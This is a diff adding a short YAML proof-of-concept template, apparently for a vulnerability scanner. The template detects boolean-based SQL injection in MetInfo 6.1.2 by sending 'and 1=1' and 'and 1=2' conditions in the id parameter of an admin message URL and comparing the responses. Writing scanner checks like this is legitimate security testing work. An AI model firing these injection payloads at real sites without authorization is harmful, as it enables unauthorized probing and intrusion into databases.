@@ -1,0 +1,17 @@
+name: poc-yaml-metinfo6-sqli
+rules:
+  - method: GET
+    path: "/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42%20and%201=1"
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string('验证码')))
+  - method: GET
+    path: "/admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn&para137=1&para186=1&para138=1&para139=1&para140=1&id=42%20and%201=2"
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string('反馈')))
+detail:
+  author: JerryKing
+  MetInfo: 6.1.2
+  links:
+    - https://anquan.baidu.com/article/382
